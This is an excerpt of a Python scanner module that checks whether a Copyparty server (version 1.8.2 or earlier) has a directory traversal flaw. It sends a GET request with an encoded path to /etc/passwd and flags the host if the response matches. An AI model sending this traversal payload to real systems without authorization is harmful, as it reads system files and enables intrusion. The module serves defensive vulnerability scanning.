...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Copyparty <= 1.8.2 - Directory Traversal Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'traversal', 'copyparty', 'copyparty_project', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/.cpr/%2Fetc%2Fpasswd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Copyparty <= 1.8.2 - Directory Traversal detected",
